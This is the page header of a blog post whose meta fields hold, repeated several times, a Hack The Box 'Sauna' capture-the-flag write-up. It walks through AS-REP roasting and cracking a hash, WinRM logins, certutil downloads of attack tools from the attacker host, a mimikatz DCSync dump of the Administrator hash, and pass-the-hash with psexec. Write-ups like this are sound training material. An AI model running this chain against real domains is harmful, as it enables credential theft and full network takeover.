<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Sauna" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.175 sauna.htb&quot; &gt;&gt; /etc/hosts Reconnaissance (1) Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 $ nmap -sV -sT -sC sauna.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 09:31 EDT Nmap scan report for sauna.htb (10.10.10.175) Host is up (0.28s latency). Not shown: 988 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-14 20:34:26Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=3/14%Time=5E6CDCEA%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\ SF:x04bind\0\0\x10\0\x03&quot;); Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h02m02s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-03-14T20:36:52 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 340.69 seconds Enumeration (1) From the nmap results, we can guess that this box is a Domain Controller from the amount of AD-related services that it is running. We are also able to pick up that the domain that this box belongs to is EGOTISTICAL-BANK.LOCAL, so lets add that to our /etc/hosts. 1 2 3 $ cat /etc/hosts ... 10.10.10.175 sauna.htb EGOTISTICAL-BANK.LOCAL There’s an IIS web server running on port 80 so lets check that out. http://EGOTISTICAL-BANK.LOCAL After navigating all the pages, it was mostly static .html content. I decided to move on to the ldap service running on port 389. I used ldapsearch to enumerate the service. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ ldapsearch -x -h EGOTISTICAL-BANK.LOCAL -b &quot;dc=EGOTISTICAL-BANK,dc=LOCAL&quot; # extended LDIF # # LDAPv3 # base &lt;dc=EGOTISTICAL-BANK,dc=LOCAL&gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # ... # Hugo Smith, EGOTISTICAL-BANK.LOCAL dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL ... # numResponses: 19 # numEntries: 15 # numReferences: 3 Hugo Smith was the only record that stood out but… http://EGOTISTICAL-BANK.LOCAL/about.html: There was no such name in the team! However, there was a Fergus Smith and a Hugo Bear, so perhaps the name was a mix between them? I was feeling lost so I decided to look up the forums for hints and there were mentions about how domain usernames are generated from the first names and last names of the users. Based on article, I created a script to generate all possible usernames: 1 2 3 4 5 6 7 8 9 from itertools import product for i in product([&quot;Fergus&quot;, &quot;Hugo&quot;, &quot;Steven&quot;, &quot;Shaun&quot;, &quot;Bowie&quot;, &quot;Sophie&quot;], [&quot;Smith&quot;, &quot;Bear&quot;, &quot;Kerb&quot;, &quot;Coins&quot;, &quot;Taylor&quot;, &quot;Driver&quot;]): first = i[0].lower() last = i[1].lower() print(&quot;{}.{}&quot;.format(first, last)) print(&quot;{}-{}&quot;.format(first, last)) print(&quot;{}{}&quot;.format(first[0], last)) print(&quot;{}{}&quot;.format(first[:3], last[:3])) I ran the script and outputted the results in a file called users.txt. To brute force to the users that exist on the system, I will be using kerbrute. 1 2 3 4 5 6 $ python kerbrute.py -users ../users.txt -domain EGOTISTICAL-BANK.LOCAL -t 10 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Valid user =&gt; fsmith [NOT PREAUTH] [*] Valid user =&gt; hsmith [*] No passwords were discovered :&#39;( We found 2 users, one of which, being fsmith, do not have Kerberos Pre-authentication enabled! This means it can be a target for ASREPRoast attack, allowing us to get a AS-REP hash, which can be cracked to retrieve his password! More information about Kerberos-related attacks can be found in this article. 1 2 3 4 5 $ python GetNPUsers.py egotistical-bank.local/fsmith -no-pass -format hashcat -outputfile hashes.asreproast -no-pass Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Getting TGT for fsmith $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:f604c7fcbb03619c4dd07a7043ec58e1$3dd66d0d07181b382d49df41e89bcc3cb39647b1ebff6813da066d41c78be9b3252c782ab6a3de196275ac1fb6b0e7ff649249bfe1e3721fd419d20c5d4b9ce64aafdd50d05e8121fcdd85d55a037822cacb5aa4a83e985bad801831c4cb9cc155d2228125a2b81e439db3b04ff6dadd67d248892949900aa6a6ad96658c52e444e6421d2a148d0c768c17cce58d374802baca7ca16f89fcee72ff75269d0cb1e528ec117fb726efe69d7f513d89004d14264a1e3f266e163b3d3df9f8b73960c379f57f5e61eb08e18c7e9da5fddb217d94b8dce22f2a8f544267608f7f722b0e59d5b4fd87f30e84152e9d8e89159d356e76c4f2282e81561cdc426d11a04e Next, we proceed to crack it with hashcat. 1 2 3 4 $ hashcat -m 18200 --force -a 0 hash.asreproast /usr/share/wordlists/rockyou.txt ... $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:f604c7fcbb03619c4dd07a7043ec58e1$3dd66d0d07181b382d49df41e89bcc3cb39647b1ebff6813da066d41c78be9b3252c782ab6a3de196275ac1fb6b0e7ff649249bfe1e3721fd419d20c5d4b9ce64aafdd50d05e8121fcdd85d55a037822cacb5aa4a83e985bad801831c4cb9cc155d2228125a2b81e439db3b04ff6dadd67d248892949900aa6a6ad96658c52e444e6421d2a148d0c768c17cce58d374802baca7ca16f89fcee72ff75269d0cb1e528ec117fb726efe69d7f513d89004d14264a1e3f266e163b3d3df9f8b73960c379f57f5e61eb08e18c7e9da5fddb217d94b8dce22f2a8f544267608f7f722b0e59d5b4fd87f30e84152e9d8e89159d356e76c4f2282e81561cdc426d11a04e:Thestrokes23 ... With the password Thestrokes23, we can login into the box. But how ? Reconnaissance (2) I did a second round of scanning, but this time with all ports from 1 to 65535. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ nmap -sS -p 1-65535 EGOTISTICAL-BANK.LOCAL Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 09:44 EDT Nmap scan report for sauna.htb (10.10.10.175) Host is up (0.24s latency). Not shown: 65515 filtered ports PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49686/tcp open unknown 63004/tcp open unknown We can use the WinRM service on port 5985 to login into the box! I will be using evil-winrm to do so. user.txt 1 2 3 4 5 6 7 ruby evil-winrm.rb -i egotistical-bank.local -u fsmith -p Thestrokes23 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; type ../Desktop/user.txt 1b55XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) With a shell now, we can enumerate the Active Directory environment using BloodHound. First we upload SharpHound.ps1 to the box. 1 2 3 *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/SharpHound.ps1 **** Online **** CertUtil: -URLCache command completed successfully. And then import it and run Invoke-BloodHound 1 2 *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; Import-Module .\SharpHound.ps1 *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; Invoke-BloodHound -CollectionMethod All -Domain egotistical-bank.local -LDAPUser FSmith -LDAPPass Thestrokes23 Fortunately, evil-winrm supports a download feature so we can use it to retrieve the results. 1 2 3 4 5 *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; download 20200719092606_BloodHound.zip /root/Desktop/sauna/20200719092606_BloodHound.zip Info: Downloading C:\Users\FSmith\Documents\20200719092606_BloodHound.zip to /root/Desktop/sauna/20200719092606_BloodHound.zip Info: Download successful! Now we start the docker-bloodhound container and upload our results. 1 2 3 4 5 6 7 8 $ docker run -it \ -p 7474:7474 \ -e DISPLAY=unix$DISPLAY \ -v /tmp/.X11-unix:/tmp/.X11-unix \ --device=/dev/dri:/dev/dri \ -v $(pwd)/data:/data \ --name bloodhound belane/bloodhound $ mv 20200719092606_BloodHound.zip $(pwd)/data After uploading the data, I tried different queries and the query, Find Principals with DCSync Rights, shows a possible path. svc-loanmgr has DCSync rights, meaning we can use that account to retrieve the credentials of any domain user, including the Administrator! But the question is, how? Lets upload WinPEAS and run it to see if we can find anything to help us! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; certutil -f -split -urlcache http://10.10.XX/winPEASx64.exe **** Online **** 000000 ... 037c00 CertUtil: -URLCache command completed successfully. *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; .\winPEASx64.exe ... [+] Looking for AutoLogon credentials(T1012) Some AutoLogon credentials were found!! DefaultDomainName : 35mEGOTISTICALBANK DefaultUserName : 35mEGOTISTICALBANK\svc_loanmanager DefaultPassword : Moneymakestheworldgoround! ... We found the password for svc_loanmanager, which is probably referring to svc_loanmgr. 1 2 3 4 5 6 7 $ ruby evil-winrm.rb -i egotistical-bank.local -u svc_loanmgr -p Moneymakestheworldgoround! Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; whoami egotisticalbank\svc_loanmgr Exploitation As svc_loanmgr, we can now perform a DCSync attack with mimikatz.exe. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/mimikatz.exe **** Online **** CertUtil: -URLCache command completed successfully. *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; .\mimikatz &quot;lsadump::dcsync /domain:egotistical-bank.local /user:Administrator&quot; &quot;exit&quot; [DC] &#39;egotistical-bank.local&#39; will be the domain [DC] &#39;SAUNA.EGOTISTICAL-BANK.LOCAL&#39; will be the DC server [DC] &#39;Administrator&#39; will be the user account Object RDN : Administrator ** SAM ACCOUNT ** SAM Username : Administrator Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) Account expiration : Password last change : 1/24/2020 10:14:15 AM Object Security ID : S-1-5-21-2966785786-3096785034-1186376766-500 Object Relative ID : 500 Credentials: Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f lm - 0: ee8c50e6bc332970a8e8a632488f5211 root.txt With the NTLM hash of Administrator, we can psexec directly into the box! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 python psexec.py Administrator@egotistical-bank.local -hashes :d9485863c1e9e05851aa40cbb4ab9dff Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on 10.10.10.175..... [*] Found writable share ADMIN$ [*] Uploading file VMlklPxX.exe [*] Opening SVCManager on 10.10.10.175..... [*] Creating service xbmD on 10.10.10.175..... [*] Starting service xbmD..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.973] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;whoami nt authority\system C:\Windows\system32&gt;more C:\Users\Administrator\Desktop\root.txt f3eeXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.175 sauna.htb&quot; &gt;&gt; /etc/hosts Reconnaissance (1) Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 $ nmap -sV -sT -sC sauna.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 09:31 EDT Nmap scan report for sauna.htb (10.10.10.175) Host is up (0.28s latency). Not shown: 988 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-14 20:34:26Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=3/14%Time=5E6CDCEA%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\ SF:x04bind\0\0\x10\0\x03&quot;); Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h02m02s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-03-14T20:36:52 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 340.69 seconds Enumeration (1) From the nmap results, we can guess that this box is a Domain Controller from the amount of AD-related services that it is running. We are also able to pick up that the domain that this box belongs to is EGOTISTICAL-BANK.LOCAL, so lets add that to our /etc/hosts. 1 2 3 $ cat /etc/hosts ... 10.10.10.175 sauna.htb EGOTISTICAL-BANK.LOCAL There’s an IIS web server running on port 80 so lets check that out. http://EGOTISTICAL-BANK.LOCAL After navigating all the pages, it was mostly static .html content. I decided to move on to the ldap service running on port 389. I used ldapsearch to enumerate the service. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ ldapsearch -x -h EGOTISTICAL-BANK.LOCAL -b &quot;dc=EGOTISTICAL-BANK,dc=LOCAL&quot; # extended LDIF # # LDAPv3 # base &lt;dc=EGOTISTICAL-BANK,dc=LOCAL&gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # ... # Hugo Smith, EGOTISTICAL-BANK.LOCAL dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL ... # numResponses: 19 # numEntries: 15 # numReferences: 3 Hugo Smith was the only record that stood out but… http://EGOTISTICAL-BANK.LOCAL/about.html: There was no such name in the team! However, there was a Fergus Smith and a Hugo Bear, so perhaps the name was a mix between them? I was feeling lost so I decided to look up the forums for hints and there were mentions about how domain usernames are generated from the first names and last names of the users. Based on article, I created a script to generate all possible usernames: 1 2 3 4 5 6 7 8 9 from itertools import product for i in product([&quot;Fergus&quot;, &quot;Hugo&quot;, &quot;Steven&quot;, &quot;Shaun&quot;, &quot;Bowie&quot;, &quot;Sophie&quot;], [&quot;Smith&quot;, &quot;Bear&quot;, &quot;Kerb&quot;, &quot;Coins&quot;, &quot;Taylor&quot;, &quot;Driver&quot;]): first = i[0].lower() last = i[1].lower() print(&quot;{}.{}&quot;.format(first, last)) print(&quot;{}-{}&quot;.format(first, last)) print(&quot;{}{}&quot;.format(first[0], last)) print(&quot;{}{}&quot;.format(first[:3], last[:3])) I ran the script and outputted the results in a file called users.txt. To brute force to the users that exist on the system, I will be using kerbrute. 1 2 3 4 5 6 $ python kerbrute.py -users ../users.txt -domain EGOTISTICAL-BANK.LOCAL -t 10 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Valid user =&gt; fsmith [NOT PREAUTH] [*] Valid user =&gt; hsmith [*] No passwords were discovered :&#39;( We found 2 users, one of which, being fsmith, do not have Kerberos Pre-authentication enabled! This means it can be a target for ASREPRoast attack, allowing us to get a AS-REP hash, which can be cracked to retrieve his password! More information about Kerberos-related attacks can be found in this article. 1 2 3 4 5 $ python GetNPUsers.py egotistical-bank.local/fsmith -no-pass -format hashcat -outputfile hashes.asreproast -no-pass Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Getting TGT for fsmith $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:f604c7fcbb03619c4dd07a7043ec58e1$3dd66d0d07181b382d49df41e89bcc3cb39647b1ebff6813da066d41c78be9b3252c782ab6a3de196275ac1fb6b0e7ff649249bfe1e3721fd419d20c5d4b9ce64aafdd50d05e8121fcdd85d55a037822cacb5aa4a83e985bad801831c4cb9cc155d2228125a2b81e439db3b04ff6dadd67d248892949900aa6a6ad96658c52e444e6421d2a148d0c768c17cce58d374802baca7ca16f89fcee72ff75269d0cb1e528ec117fb726efe69d7f513d89004d14264a1e3f266e163b3d3df9f8b73960c379f57f5e61eb08e18c7e9da5fddb217d94b8dce22f2a8f544267608f7f722b0e59d5b4fd87f30e84152e9d8e89159d356e76c4f2282e81561cdc426d11a04e Next, we proceed to crack it with hashcat. 1 2 3 4 $ hashcat -m 18200 --force -a 0 hash.asreproast /usr/share/wordlists/rockyou.txt ... $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:f604c7fcbb03619c4dd07a7043ec58e1$3dd66d0d07181b382d49df41e89bcc3cb39647b1ebff6813da066d41c78be9b3252c782ab6a3de196275ac1fb6b0e7ff649249bfe1e3721fd419d20c5d4b9ce64aafdd50d05e8121fcdd85d55a037822cacb5aa4a83e985bad801831c4cb9cc155d2228125a2b81e439db3b04ff6dadd67d248892949900aa6a6ad96658c52e444e6421d2a148d0c768c17cce58d374802baca7ca16f89fcee72ff75269d0cb1e528ec117fb726efe69d7f513d89004d14264a1e3f266e163b3d3df9f8b73960c379f57f5e61eb08e18c7e9da5fddb217d94b8dce22f2a8f544267608f7f722b0e59d5b4fd87f30e84152e9d8e89159d356e76c4f2282e81561cdc426d11a04e:Thestrokes23 ... With the password Thestrokes23, we can login into the box. But how ? Reconnaissance (2) I did a second round of scanning, but this time with all ports from 1 to 65535. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ nmap -sS -p 1-65535 EGOTISTICAL-BANK.LOCAL Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 09:44 EDT Nmap scan report for sauna.htb (10.10.10.175) Host is up (0.24s latency). Not shown: 65515 filtered ports PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49686/tcp open unknown 63004/tcp open unknown We can use the WinRM service on port 5985 to login into the box! I will be using evil-winrm to do so. user.txt 1 2 3 4 5 6 7 ruby evil-winrm.rb -i egotistical-bank.local -u fsmith -p Thestrokes23 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; type ../Desktop/user.txt 1b55XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) With a shell now, we can enumerate the Active Directory environment using BloodHound. First we upload SharpHound.ps1 to the box. 1 2 3 *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/SharpHound.ps1 **** Online **** CertUtil: -URLCache command completed successfully. And then import it and run Invoke-BloodHound 1 2 *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; Import-Module .\SharpHound.ps1 *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; Invoke-BloodHound -CollectionMethod All -Domain egotistical-bank.local -LDAPUser FSmith -LDAPPass Thestrokes23 Fortunately, evil-winrm supports a download feature so we can use it to retrieve the results. 1 2 3 4 5 *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; download 20200719092606_BloodHound.zip /root/Desktop/sauna/20200719092606_BloodHound.zip Info: Downloading C:\Users\FSmith\Documents\20200719092606_BloodHound.zip to /root/Desktop/sauna/20200719092606_BloodHound.zip Info: Download successful! Now we start the docker-bloodhound container and upload our results. 1 2 3 4 5 6 7 8 $ docker run -it \ -p 7474:7474 \ -e DISPLAY=unix$DISPLAY \ -v /tmp/.X11-unix:/tmp/.X11-unix \ --device=/dev/dri:/dev/dri \ -v $(pwd)/data:/data \ --name bloodhound belane/bloodhound $ mv 20200719092606_BloodHound.zip $(pwd)/data After uploading the data, I tried different queries and the query, Find Principals with DCSync Rights, shows a possible path. svc-loanmgr has DCSync rights, meaning we can use that account to retrieve the credentials of any domain user, including the Administrator! But the question is, how? Lets upload WinPEAS and run it to see if we can find anything to help us! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; certutil -f -split -urlcache http://10.10.XX/winPEASx64.exe **** Online **** 000000 ... 037c00 CertUtil: -URLCache command completed successfully. *Evil-WinRM* PS C:\Users\FSmith\Documents&gt; .\winPEASx64.exe ... [+] Looking for AutoLogon credentials(T1012) Some AutoLogon credentials were found!! DefaultDomainName : 35mEGOTISTICALBANK DefaultUserName : 35mEGOTISTICALBANK\svc_loanmanager DefaultPassword : Moneymakestheworldgoround! ... We found the password for svc_loanmanager, which is probably referring to svc_loanmgr. 1 2 3 4 5 6 7 $ ruby evil-winrm.rb -i egotistical-bank.local -u svc_loanmgr -p Moneymakestheworldgoround! Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; whoami egotisticalbank\svc_loanmgr Exploitation As svc_loanmgr, we can now perform a DCSync attack with mimikatz.exe. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/mimikatz.exe **** Online **** CertUtil: -URLCache command completed successfully. *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; .\mimikatz &quot;lsadump::dcsync /domain:egotistical-bank.local /user:Administrator&quot; &quot;exit&quot; [DC] &#39;egotistical-bank.local&#39; will be the domain [DC] &#39;SAUNA.EGOTISTICAL-BANK.LOCAL&#39; will be the DC server [DC] &#39;Administrator&#39; will be the user account Object RDN : Administrator ** SAM ACCOUNT ** SAM Username : Administrator Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) Account expiration : Password last change : 1/24/2020 10:14:15 AM Object Security ID : S-1-5-21-2966785786-3096785034-1186376766-500 Object Relative ID : 500 Credentials: Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f lm - 0: ee8c50e6bc332970a8e8a632488f5211 root.txt With the NTLM hash of Administrator, we can psexec directly into the box! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 python psexec.py Administrator@egotistical-bank.local -hashes :d9485863c1e9e05851aa40cbb4ab9dff Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on 10.10.10.175..... [*] Found writable share ADMIN$ [*] Uploading file VMlklPxX.exe [*] Opening SVCManager on 10.10.10.175..... [*] Creating service xbmD on 10.10.10.175..... [*] Starting service xbmD..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.973] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;whoami nt authority\system C:\Windows\system32&gt;more C:\Users\Administrator\Desktop\root.txt f3eeXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/sauna-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/sauna-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-07-19T19:50:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Sauna" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/sauna-htb/"},"description":"Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.175 sauna.htb&quot; &gt;&gt; /etc/hosts Reconnaissance (1) Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 $ nmap -sV -sT -sC sauna.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 09:31 EDT Nmap scan report for sauna.htb (10.10.10.175) Host is up (0.28s latency). Not shown: 988 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-14 20:34:26Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=3/14%Time=5E6CDCEA%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,&quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03&quot;); Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h02m02s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-03-14T20:36:52 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 340.69 seconds Enumeration (1) From the nmap results, we can guess that this box is a Domain Controller from the amount of AD-related services that it is running. We are also able to pick up that the domain that this box belongs to is EGOTISTICAL-BANK.LOCAL, so lets add that to our /etc/hosts. 1 2 3 $ cat /etc/hosts ... 10.10.10.175 sauna.htb EGOTISTICAL-BANK.LOCAL There’s an IIS web server running on port 80 so lets check that out. http://EGOTISTICAL-BANK.LOCAL After navigating all the pages, it was mostly static .html content. I decided to move on to 